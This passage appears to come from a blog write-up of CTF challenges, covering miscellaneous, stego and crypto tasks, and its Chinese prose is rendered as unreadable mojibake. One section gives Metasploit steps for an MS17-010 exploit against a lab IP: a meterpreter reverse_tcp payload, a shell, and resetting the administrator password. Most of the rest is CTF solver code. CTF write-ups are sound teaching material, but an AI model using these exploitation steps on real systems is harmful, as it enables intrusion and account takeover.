auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token number\">5</span>  exploit/windows/fileformat/office_ms17_11882          <span class=\"token number\">2017</span>-11-15       manual   No     Microsoft Office CVE-2017-11882</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token number\">6</span>  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token number\">7</span>  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token number\">8</span>  exploit/windows/smb/smb_doublepulsar_rce              <span class=\"token number\">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</pre></td></tr></table></figure><p>ÈÄâÊã© 2</p>\n<p>ËøõË°åËÆæÁΩÆ</p>\n<blockquote>\n<p>set rhosts 192.168.85.133</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</blockquote>\n<p>run</p>\n<p>ËøõË°å‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†Å</p>\n<blockquote>\n<p>shell</p>\n<p>net user administrator 123456</p>\n</blockquote>\n<p>or</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/16.png\" alt=\"16\"></p>\n<p>FLAG Âú®ÂõæÁâáÈáåÈù¢</p>\n<h3 id=\"simpleconnect\"><a class=\"markdownIt-Anchor\" href=\"#simpleconnect\">#</a> SimpleConnect</h3>\n<h3 id=\"give_me_goerlieth\"><a class=\"markdownIt-Anchor\" href=\"#give_me_goerlieth\">#</a> give_me_Goerlieth</h3>\n<p>Ëøô‰∏§‰∏™È¢òÊàëÂÅöÊ≥ï‰∏ÄÊ†∑ÔºåÊâæÂà∞‰∫§ÊòìËÆ∞ÂΩïÔºåÊèê‰∫§Âà´‰∫∫ÁöÑ hash ÂíåÂú∞ÂùÄÂ∞±Ë°å„ÄÇ</p>\n<h3 id=\"death_n2te\"><a class=\"markdownIt-Anchor\" href=\"#death_n2te\">#</a> DEATH_N2TE</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># ËßÜÈ¢ëÊñá‰ª∂Ë∑ØÂæÑ</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>video_path <span class=\"token operator\">=</span> <span class=\"token string\">'kira.mp4'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># ÊâìÂºÄËßÜÈ¢ëÊñá‰ª∂</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>cap <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>VideoCapture<span class=\"token punctuation\">(</span>video_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Ëé∑ÂèñËßÜÈ¢ëÁöÑÂ∏ßÂÆΩÂ∫¶ÂíåÂ∏ßÈ´òÂ∫¶</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>frame_width <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1920</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>frame_height <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1080</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># ÂàõÂª∫‰∏Ä‰∏™Á©∫ÁöÑÂõæÁâáÔºåÁî®‰∫éÂ≠òÂÇ®ÊèêÂèñÁöÑÂÉèÁ¥†ÁÇπ</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># ÂõæÁâáÂÆΩÂ∫¶‰∏∫ËßÜÈ¢ëÁöÑÂ∏ßÂÆΩÂ∫¶</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># ÂõæÁâáÈ´òÂ∫¶‰∏∫ËßÜÈ¢ëÁöÑÂ∏ßÊï∞ÔºàÂàùÂßãÂåñÊó∂ÂÅáËÆæËßÜÈ¢ëÂ∏ßÊï∞‰∏ç‰ºöË∂ÖËøá frame_heightÔºâ</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>frame_height<span class=\"token punctuation\">,</span> frame_width<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># ÈòàÂÄº</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>threshold <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># ÂÆö‰πâËµ∑ÂßãÂàóÂíåÂàóÈó¥Èöî</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>start_col <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>col_interval <span class=\"token operator\">=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># ËØªÂèñËßÜÈ¢ëÂ∏ß</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>frame_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>col_count <span class=\"token operator\">=</span> start_col</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    ret<span class=\"token punctuation\">,</span> frame <span class=\"token operator\">=</span> cap<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ret <span class=\"token keyword\">or</span> frame_count <span class=\"token operator\">>=</span> frame_height<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">break</span>  <span class=\"token comment\"># Â¶ÇÊûúËØªÂèñÂ§±Ë¥•ÊàñËÄÖÂ∏ßÊï∞Ë∂ÖËøá‰∫ÜÈ¢ÑËÆæÁöÑÈ´òÂ∫¶ÔºåÂàôÂÅúÊ≠¢ËØªÂèñ</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># ‰ªéÊØè‰∏ÄÂ∏ßËØªÂèñÂØπÂ∫îÂàóÂè∑ÁöÑÂÉèÁ¥†</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># Á°Æ‰øùÂàóÂè∑Ê≤°ÊúâË∂ÖÂá∫ÂÆΩÂ∫¶ËåÉÂõ¥</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> col_count <span class=\"token operator\">&lt;</span> frame_width<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        col_to_scan <span class=\"token operator\">=</span> frame<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> col_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\"># ÊèêÂèñÂ§ß‰∫éÁ≠â‰∫éÈòàÂÄºÁöÑÂÉèÁ¥†</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        white_pixels <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>col_to_scan <span class=\"token operator\">>=</span> threshold<span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token comment\"># Â∞ÜÊèêÂèñÁöÑÂÉèÁ¥†ËÆæÁΩÆÂà∞Êñ∞ÂõæÁâáÁöÑÂØπÂ∫îÂàó</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        extracted_image<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">,</span> frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> col_to_scan<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\"># Êõ¥Êñ∞ÂàóÊï∞Ôºå‰∏∫‰∏ã‰∏ÄÂ∏ßÂáÜÂ§á</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        col_count <span class=\"token operator\">+=</span> col_interval</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># Êõ¥Êñ∞Â∏ßÊï∞</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    frame_count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># ÈáäÊîæËßÜÈ¢ëËµÑÊ∫ê</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>cap<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># Ë£ÅÂâ™ÂõæÁâá‰ª•ÂåπÈÖçÂÆûÈôÖËØªÂèñÁöÑÂ∏ßÊï∞</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> extracted_image<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span>frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># ‰øùÂ≠òÊèêÂèñÁöÑÂÉèÁ¥†ÂΩ¢ÊàêÁöÑÂõæÁâá</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span><span class=\"token string\">'extracted_image.png'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\"># ÊòæÁ§∫ÂõæÁâá</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imshow<span class=\"token punctuation\">(</span><span class=\"token string\">'Extracted Image'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>waitKey<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>destroyAllWindows<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/17.png\" alt=\"image-20231120094433088\"></p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"signin\"><a class=\"markdownIt-Anchor\" href=\"#signin\">#</a> SignIn</h3>\n<blockquote>\n<p>5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d‚Ä¶ Hmm‚Ä¶ Something goes wrong with my grettings bot.</p>\n</blockquote>\n<p>‰πâÁúºÁõØÁúü„ÄÇ16 ËøõÂà∂ ascii ËΩ¨ÂåñÂæóÂà∞ flag</p>\n<h3 id=\"proof_of_work\"><a class=\"markdownIt-Anchor\" href=\"#proof_of_work\">#</a> proof_of_work</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pass_POW</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    rec <span class=\"token operator\">=</span> <span class=\"token string\">'sha256(XXXX+FCxk8M9svYwVMfGe) == 793edc396da13a7992b429e50e7d122c41debbd902419d26a0792b4008dba844'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    table <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    suffix <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\(XXXX\\+(.*?)\\)'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    last_hash <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'== (.*?)$'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"suffix: %s, last_hash: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">,</span> last_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> product<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        prefix <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        guess <span class=\"token operator\">=</span> prefix <span class=\"token operator\">+</span> suffix</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> last_hash<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prefix XXXX is %s\"</span> <span class=\"token operator\">%</span> prefix<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> prefix</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pass_POW<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/11.png\" alt=\"image-20231029212225830\"></p>\n<h3 id=\"simplersa\"><a class=\"markdownIt-Anchor\" href=\"#simplersa\">#</a> SimpleRSA</h3>\n<p>Á¨¨‰∏ÄÊ¨°ËßÅÔºåÊ∂®ÂßøÂäø‰∫Ü„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">35</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>powmod<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/12.png\" alt=\"image-20231029212545246\"></p>\n<h3 id=\"otptwice\"><a class=\"markdownIt-Anchor\" href=\"#otptwice\">#</a> OTPTwice</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> os <span class=\"token keyword\">import</span> urandom </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># step0: key generation &amp; distribution</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s0</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>urandom<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> k1<span class=\"token punctuation\">,</span>k2 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#  </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># step1: Alice encrypt M, and send it to Bob</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s1</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    c1 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> c1 </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># step2: Bob encrypt c1, and send it to Alice </span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s2</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    c2 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> c2 </pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># step3: Alice decrypt c2, and send it to Bob.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s3</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    c3 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> c3 </pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># step4: Bob decrypt c3, get M.</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s4</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    m_ <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> m_ </pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    c2 <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">assert</span> msg <span class=\"token operator\">==</span> m_</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># Here's what hacker Eve got:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    c2 <span class=\"token operator\">=</span> 